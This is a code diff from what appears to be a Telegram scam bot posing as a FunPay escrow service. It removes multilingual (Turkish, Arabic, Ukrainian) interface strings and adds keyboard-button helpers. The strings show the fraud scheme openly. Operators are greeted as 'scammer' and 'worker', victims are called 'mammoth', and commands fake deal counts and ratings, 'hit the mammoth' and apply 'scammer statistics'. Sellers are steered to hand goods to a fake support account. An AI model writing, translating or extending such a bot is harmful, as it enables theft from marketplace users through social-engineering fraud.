-        "confirm_wait_scammer": "✅ Transfer onaylandı! Dolandırıcı onayı bekleniyor.",
-        "unknown_command": "Bilinmeyen komut.\nBaşlamak için /start kullanın.",
-        "function_in_development": "Fonksiyon geliştirme aşamasında...",
-        "set_sdel_usage": "Kullanım: /set_sdel <sayı> [kullanıcı/id]",
-        "set_ret_usage": "Kullanım: /set_ret <puan> [kullanıcı/id]",
-        "count_must_be_number": "Sayı olmalı",
-        "rating_must_be_number": "Puan sayı olmalı",
-        "rating_range": "Puan 0 ile 5 arasında olmalı",
-        "user_not_found": "Kullanıcı bulunamadı",
-        "invalid_format": "Geçersiz format",
-        "set_for": "{target} için {count} başarılı anlaşma ayarlandı",
-        "set_rating_for": "{target} için puan {rating} ayarlandı",
-        "added_gram": "GRAM cüzdanı başarıyla eklendi!",
-        "added_card": "Kart başarıyla eklendi!",
-        "requisites_deleted": "Tüm requisitler silindi!",
-        "stats_applied": "✅ Dolandırıcı istatistikleri uygulandı!",
-    },
-    "ar": {
-        "welcome": "مرحباً بك في FunPay!",
-        "select_language": "اختر اللغة:",
-        "language_set": "✅ تم ضبط اللغة: العربية",
-        "main_menu": "القائمة الرئيسية",
-        "create_deal": "إنشاء صفقة",
-        "profile": "الملف الشخصي",
-        "withdraw": "سحب",
-        "requisites": "المتطلبات",
-        "referrals": "الإحالات",
-        "language": "اللغة",
-        "support": "الدعم",
-        "admin_panel": "لوحة التحكم",
-        "back": "رجوع",
-        "ok": "موافق",
-        "access_denied": "❌ تم رفض الوصول.",
-        "deal_not_found": "❌ الصفقة غير موجودة.",
-        "deal_already_paid": "❌ هذه الصفقة مدفوعة بالفعل أو مكتملة.",
-        "deal_not_joined": "❌ الماموث لم ينضم إلى الصفقة بعد.",
-        "invalid_amount": "❌ أدخل رقماً صحيحاً",
-        "description_too_long": "❌ الوصف طويل جداً (الحد الأقصى 200 حرف)",
-        "no_requisites": "❌ لم تقم بإضافة متطلبات بعد!\n\nأضفها هنا: القائمة الرئيسية → المتطلبات → إضافة",
-        "invalid_gram": "❌ عنوان محفظة غير صحيح!\n\n❗ التنسيق: افتح المحفظة -> انسخ العنوان الدقيق -> الصق النص المنسوخ",
-        "invalid_card": "❌ تنسيق بطاقة غير صحيح!\n\nأدخل 16 رقماً",
-        "enter_card": "أدخل رقم البطاقة:",
-        "deal_created": "✅ تم إنشاء الصفقة!",
-        "deal_code": "رمز الصفقة",
-        "amount": "المبلغ",
-        "description": "الوصف",
-        "commission": "العمولة",
-        "status": "الحالة",
-        "completed": "تم إكمال الصفقة بنجاح",
-        "wait_for_goods": "يرجى انتظار وصول السلعة إلى حسابك!",
-        "wait_for_payment": "انتظر وصول الدفع إلى المحفظة التي حددتها سابقاً!",
-        "choose_currency": "اختر عملة الصفقة:",
-        "enter_amount": "أدخل مبلغ الصفقة:",
-        "enter_description": "ماذا تقدم مقابل {amount} {currency}؟",
-        "share_link": "رابط للمشتري:",
-        "send_link": "يمكنك الانتقال إلى الصفقة معي عبر هذا الرابط 🤝",
-        "deal_cancelled": "تم إلغاء الصفقة",
-        "payment_received": "تم استلام دفعة الصفقة بنجاح!",
-        "seller_notified": "تم إخطار البائع",
-        "deal_paid_status": "حالة الصفقة: دفع المشتري بنجاح",
-        "wait_seller_transfer": "انتظر حتى يقوم البائع بنقل السلعة إلى {support}، ثم قم بتأكيد ذلك في البوت!",
-        "transfer_only_to": "انقل السلعة فقط إلى",
-        "or_no_payment": "خلاف ذلك، لن يتمكن المشتري من تأكيد استلام السلعة، ولن تحصل على الدفع.",
-        "recommend_screen_record": "نوصي بتسجيل الشاشة أثناء النقل حتى يتمكن الدعم من فهم الموقف بشكل أفضل إذا لزم الأمر.",
-        "seller_confirmed": "حالة الصفقة: دفع المشتري بنجاح، أكد البائع النقل",
-        "wait_scammer_confirm": "بانتظار تحقق المشتري وتأكيد النقل إلى {support}.",
-        "if_not_transferred": "إذا لم يتم نقل السلعة إلى {support}، فلن يتمكن المشتري من تأكيد الاستلام، ولن تحصل على الدفع!",
-        "scammer_check": "تحقق من نقل السلعة إلى {support} وأكد ذلك في نظام البوت.",
-        "after_confirm_payment": "بعد التأكيد، سيتم إرسال الدفع إلى البائع بشكل غير قابل للإلغاء، وسيتم إرسال السلعة إليك!",
-        "confirm_transfer": "تأكيد النقل",
-        "confirm_receipt": "تأكيد الاستلام",
-        "hit_mammoth": "ضرب الماموث",
-        "stats": "الإحصائيات",
-        "all_deals": "جميع الصفقات",
-        "all_users": "جميع المستخدمين",
-        "total_users": "إجمالي المستخدمين",
-        "total_deals": "إجمالي الصفقات",
-        "statuses": "الحالات",
-        "last_10_deals": "آخر 10 صفقات",
-        "last_10_users": "آخر 10 مستخدمين",
-        "no_deals": "لا توجد صفقات",
-        "no_users": "لا يوجد مستخدمين",
-        "profile_title": "الملف الشخصي",
-        "id": "المعرف",
-        "username": "اسم المستخدم",
-        "name": "الاسم",
-        "successful_deals": "الصفقات الناجحة",
-        "rating": "التقييم",
-        "balance": "الرصيد",
-        "total_deals_count": "إجمالي الصفقات",
-        "completed_deals": "مكتمل",
-        "withdraw_title": "سحب الأموال",
-        "min_withdraw": "الحد الأدنى للسحب: 1000 RUB",
-        "your_balance": "رصيدك",
-        "your_requisites": "متطلبات السحب الخاصة بك",
-        "withdraw_request_sent": "تم إرسال طلب السحب! انتظر المعالجة.",
-        "no_requisites_withdraw": "ليس لديك متطلبات للسحب!\n\nأضف المتطلبات في قائمة 'المتطلبات'",
-        "referrals_title": "نظام الإحالات",
-        "referrals_text": "ادعُ أصدقاءك واحصل على مكافآت!\nرابط الإحالة الخاص بك:",
-        "referrals_bonus": "تحصل على 5% من صفقات كل صديق تدعوه!",
-        "language_title": "🌍 اختر اللغة / Choose language / Dil seçin / Select language / Оберіть мову:",
-        "admin_welcome": "مرحباً أيها العامل!",
-        "admin_commands": "أوامرنا:",
-        "scammer_welcome": "مرحباً أيها المحتال!",
-        "scammer_commands": "الأوامر المتاحة:",
-        "buy_command": "/buy *رمز-الصفقة* – لدفع ثمن الصفقة",
-        "set_sdel": "/set_sdel – لتعيين الصفقات الناجحة",
-        "set_ret": "/set_ret – لتعيين التقييم (في الملف الشخصي)",
-        "twodeal": "/twodeal *معرف/مستخدم* – رسالة حول الصفقة الثانية",
-        "send_command": "/send *نص* *معرف/مستخدم* – إرسال رسالة",
-        "chat_command": "/chat *معرف/مستخدم* – تحميل سجل المحادثة",
-        "profile_command": "/profile – عرض الملف الشخصي",
-        "balance_command": "/balance – الرصيد",
-        "withdraw_command": "/withdraw – سحب الأموال",
-        "apply_stats": "/apply_stats – تطبيق إحصائيات المحتال",
-        "use_buy": "استخدم: /buy #رمز-الصفقة",
-        "buy_confirm": "هل أنت متأكد أنك تريد دفع ثمن الصفقة #{code}؟",
-        "mammoth": "الماموث",
-        "unknown": "غير معروف",
-        "buyer_profile": "ملف المشتري:",
-        "your_profile_seller": "ملفك الشخصي (بائع):",
-        "joined_deal": "انضم إلى الصفقة",
-        "do_not_transfer": "لا تنقل السلعة إلى {support} حتى يخطر البوت بدفع المشتري!",
-        "stars_payment": "الدفع عبر الدعم:\nانقر على زر 'الدعم' أدناه — سيرشدك المشغل حول كيفية الدفع بالنجوم.\n\n👉 {scammer}\n\nبعد الدفع الناجح، ستتغير حالة الصفقة وسيتلقى البائع إشعاراً!",
-        "requisites_for_payment": "المتطلبات للدفع:",
-        "after_payment": "بعد الدفع الناجح، ستتغير حالة الصفقة وسيتلقى البائع إشعاراً!",
-        "deal_already_processing": "❌ الصفقة قيد المعالجة بالفعل!",
-        "transfer_already_confirmed": "❌ تم تأكيد النقل بالفعل!",
-        "deal_already_completed": "❌ مكتملة بالفعل!",
-        "deal_not_found_alert": "❌ الصفقة غير موجودة! تحقق من الرمز.",
-        "confirm_wait_scammer": "✅ تم تأكيد النقل! بانتظار تأكيد المحتال.",
-        "unknown_command": "أمر غير معروف.\nاستخدم /start للبدء.",
-        "function_in_development": "الوظيفة قيد التطوير...",
-        "set_sdel_usage": "استخدم: /set_sdel <عدد> [معرف/مستخدم]",
-        "set_ret_usage": "استخدم: /set_ret <تقييم> [معرف/مستخدم]",
-        "count_must_be_number": "يجب أن يكون العدد رقماً",
-        "rating_must_be_number": "يجب أن يكون التقييم رقماً",
-        "rating_range": "يجب أن يكون التقييم من 0 إلى 5",
-        "user_not_found": "المستخدم غير موجود",
-        "invalid_format": "تنسيق غير صحيح",
-        "set_for": "تم تعيين {count} صفقة ناجحة لـ {target}",
-        "set_rating_for": "تم تعيين التقييم {rating} لـ {target}",
-        "added_gram": "تمت إضافة محفظة GRAM بنجاح!",
-        "added_card": "تمت إضافة البطاقة بنجاح!",
-        "requisites_deleted": "تم حذف جميع المتطلبات!",
-        "stats_applied": "✅ تم تطبيق إحصائيات المحتال!",
-    },
-    "ua": {
-        "welcome": "Ласкаво просимо до FunPay!",
-        "select_language": "Оберіть мову:",
-        "language_set": "✅ Мову встановлено: Українська",
-        "main_menu": "Головне меню",
-        "create_deal": "Створити угоду",
-        "profile": "Профіль",
-        "withdraw": "Вивід",
-        "requisites": "Реквізити",
-        "referrals": "Реферали",
-        "language": "Мова",
-        "support": "Підтримка",
-        "admin_panel": "Адмін-панель",
-        "back": "Назад",
-        "ok": "OK",
-        "access_denied": "❌ Доступ заборонено.",
-        "deal_not_found": "❌ Угоду не знайдено.",
-        "deal_already_paid": "❌ Цю угоду вже оплачено або завершено.",
-        "deal_not_joined": "❌ Мамонт ще не приєднався до угоди.",
-        "invalid_amount": "❌ Введіть коректне число",
-        "description_too_long": "❌ Опис занадто довгий (макс 200 символів)",
-        "no_requisites": "❌ У вас ще не додано реквізит!\n\nДодайте його тут: Головне меню → Реквізити → Додати",
-        "invalid_gram": "❌ Ви вказали неправильну адресу гаманця!\n\n❗ Формат: відкрийте гаманець -> скопіюйте точну адресу -> вставте скопійований текст",
-        "invalid_card": "❌ Неправильний формат картки!\n\nВведіть 16 цифр",
-        "enter_card": "Введіть номер картки:",
-        "deal_created": "✅ Угоду створено!",
-        "deal_code": "Номер угоди",
-        "amount": "Сума",
-        "description": "Опис",
-        "commission": "Комісія",
-        "status": "Статус",
-        "completed": "УГОДУ УСПІШНО ЗАВЕРШЕНО",
-        "wait_for_goods": "Будь ласка, зачекайте надходження товару на ваш акаунт!",
-        "wait_for_payment": "Очікуйте надходження оплати на вказаний вами раніше гаманець!",
-        "choose_currency": "Оберіть валюту угоди:",
-        "enter_amount": "Введіть суму угоди:",
-        "enter_description": "Що ви пропонуєте за {amount} {currency}?",
-        "share_link": "Посилання для покупця:",
-        "send_link": "За цим посиланням можна перейти до угоди зі мною 🤝",
-        "deal_cancelled": "Угоду скасовано",
-        "payment_received": "Оплату за угодою успішно отримано!",
-        "seller_notified": "Продавець отримав сповіщення",
-        "deal_paid_status": "Статус угоди: покупець успішно оплатив",
-        "wait_seller_transfer": "Зачекайте, поки продавець передасть товар на акаунт {support}, а потім підтвердіть це в боті!",
-        "transfer_only_to": "ПЕРЕДАВАЙТЕ ТОВАР ТІЛЬКИ",
-        "or_no_payment": "В іншому випадку покупець не зможе підтвердити отримання товару, а ви не зможете отримати оплату.",
-        "recommend_screen_record": "Рекомендуємо записувати екран під час передачі товару, щоб підтримка могла краще розібратися в ситуації за потреби.",
-        "seller_confirmed": "Статус угоди: покупець успішно оплатив, продавець підтвердив передачу товару",
-        "wait_scammer_confirm": "Очікуйте перевірки покупцем і підтвердження переказу на акаунт {support}.",
-        "if_not_transferred": "Якщо товар не було передано на {support}, покупець не зможе підтвердити отримання, а ви не отримаєте оплату!",
-        "scammer_check": "Перевірте передачу товару на {support} і підтвердіть це в системі бота.",
-        "after_confirm_payment": "Після підтвердження оплата буде безповоротно надіслана продавцю, а товар — надіслано вам!",
-        "confirm_transfer": "Підтвердити передачу",
-        "confirm_receipt": "Підтвердити отримання",
-        "hit_mammoth": "Вдарити мамонта",
-        "stats": "Статистика",
-        "all_deals": "Всі угоди",
-        "all_users": "Всі користувачі",
-        "total_users": "Всього користувачів",
-        "total_deals": "Всього угод",
-        "statuses": "Статуси",
-        "last_10_deals": "Останні 10 угод",
-        "last_10_users": "Останні 10 користувачів",
-        "no_deals": "Немає угод",
-        "no_users": "Немає користувачів",
-        "profile_title": "Профіль",
-        "id": "ID",
-        "username": "Юзернейм",
-        "name": "Ім'я",
-        "successful_deals": "Успішних угод",
-        "rating": "Рейтинг",
-        "balance": "Баланс",
-        "total_deals_count": "Всього угод",
-        "completed_deals": "Завершено",
-        "withdraw_title": "Вивід коштів",
-        "min_withdraw": "Мінімальна сума для виводу: 1000 RUB",
-        "your_balance": "Ваш баланс",
-        "your_requisites": "Ваші реквізити для виводу",
-        "withdraw_request_sent": "Заявку на вивід надіслано! Очікуйте обробки.",
-        "no_requisites_withdraw": "У вас немає реквізитів для виводу!\n\nДодайте реквізити в меню 'Реквізити'",
-        "referrals_title": "Реферальна система",
-        "referrals_text": "Запрошуйте друзів і отримуйте бонуси!\nВаше реферальне посилання:",
-        "referrals_bonus": "За кожного запрошеного друга ви отримуєте 5% від його угод!",
-        "language_title": "🌍 Оберіть мову / Select language / Dil seçin / اختر اللغة / Choose language:",
-        "admin_welcome": "Вітаю, працівнику!",
-        "admin_commands": "Наші команди:",
-        "scammer_welcome": "Вітаю, скамер!",
-        "scammer_commands": "Доступні команди:",
-        "buy_command": "/buy *код-угоди* – для оплати угоди",
-        "set_sdel": "/set_sdel – для встановлення успішних угод",
-        "set_ret": "/set_ret – для встановлення рейтингу (в профілі)",
-        "twodeal": "/twodeal *юз/айді* – повідомлення про другу угоду",
-        "send_command": "/send *текст* *юз/айді* – надіслати повідомлення",
-        "chat_command": "/chat *юз/айді* – вивантажити історію листування",
-        "profile_command": "/profile – перегляд профілю",
-        "balance_command": "/balance – баланс",
-        "withdraw_command": "/withdraw – вивід коштів",
-        "apply_stats": "/apply_stats – застосувати статистику скамерів",
-        "use_buy": "Використовуйте: /buy #код-угоди",
-        "buy_confirm": "Ви впевнені, що хочете провести оплату за угодою #{code}?",
-        "mammoth": "Мамонт",
-        "unknown": "Невідомо",
-        "buyer_profile": "Профіль покупця:",
-        "your_profile_seller": "Ваш профіль (продавець):",
-        "joined_deal": "приєднався до угоди",
-        "do_not_transfer": "Не передавайте товар на {support}, поки бот не повідомить про оплату!",
-        "stars_payment": "Оплата через підтримку:\nНатисніть кнопку «Підтримка» нижче — оператор підкаже, як оплатити зірками.\n\n👉 {scammer}\n\nПісля успішної оплати статус угоди зміниться, і продавець отримає сповіщення про вашу успішну оплату!",
-        "requisites_for_payment": "Реквізити для оплати:",
-        "after_payment": "Після успішної оплати статус угоди зміниться, і продавець отримає сповіщення про вашу успішну оплату!",
-        "deal_already_processing": "❌ Угода вже в обробці!",
-        "transfer_already_confirmed": "❌ Передачу вже підтверджено!",
-        "deal_already_completed": "❌ Вже завершено!",
-        "deal_not_found_alert": "❌ Угоду не знайдено! Перевірте код.",
-        "confirm_wait_scammer": "✅ Передачу підтверджено! Очікуйте підтвердження від скамера.",
-        "unknown_command": "Невідома команда.\nВикористовуйте /start для початку роботи.",
-        "function_in_development": "Функція в розробці...",
-        "set_sdel_usage": "Використовуйте: /set_sdel <кількість> [юз/айді]",
-        "set_ret_usage": "Використовуйте: /set_ret <рейтинг> [юз/айді]",
-        "count_must_be_number": "Кількість має бути числом",
-        "rating_must_be_number": "Рейтинг має бути числом",
-        "rating_range": "Рейтинг має бути від 0 до 5",
-        "user_not_found": "Користувача не знайдено",
-        "invalid_format": "Неправильний формат",
-        "set_for": "Встановлено {count} успішних угод для {target}",
-        "set_rating_for": "Встановлено рейтинг {rating} для {target}",
-        "added_gram": "Гаманець GRAM успішно додано!",
-        "added_card": "Картку успішно додано!",
-        "requisites_deleted": "Всі реквізити видалено!",
-        "stats_applied": "✅ Статистику скамерів застосовано!",
-    }
-}
+def back_button():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Назад", callback_data="back_to_main", icon_custom_emoji_id=ICON_BACK)]
+    ])
 
-def get_text(lang, key, **kwargs):
-    text = TEXTS.get(lang, TEXTS.get("ru", {})).get(key, key)
-    if kwargs:
-        try:
-            text = text.format(**kwargs)
-        except:
-            pass
-    return text
+def ok_button():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="OK", callback_data="back_to_main", icon_custom_emoji_id=ICON_CHECK)]
+    ])
+
+def share_deal(deal_code, deal_link):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Поделиться ссылкой", callback_data=f"share_send_{deal_code}", icon_custom_emoji_id=ICON_SHARE)],
+        [InlineKeyboardButton(text="Отмена", callback_data=f"cancel_deal_{deal_code}", icon_custom_emoji_id=ICON_CROSS)]
+    ])
+
+def support_button():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Поддержка", url=f"https://t.me/{SUPPORT_USERNAME.replace('@', '')}", icon_custom_emoji_id=ICON_CHAT)]
+    ])
+
+def empty_keyboard():
+    return InlineKeyboardMarkup(inline_keyboard=[])
+
+def language_selection_menu():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru")],
+        [InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
+        [InlineKeyboardButton(text="🇹🇷 Türkçe", callback_data="lang_tr")],
+        [InlineKeyboardButton(text="🇸🇦 العربية", callback_data="lang_ar")],
+        [InlineKeyboardButton(text="🇺🇦 Українська", callback_data="lang_ua")]
+    ])
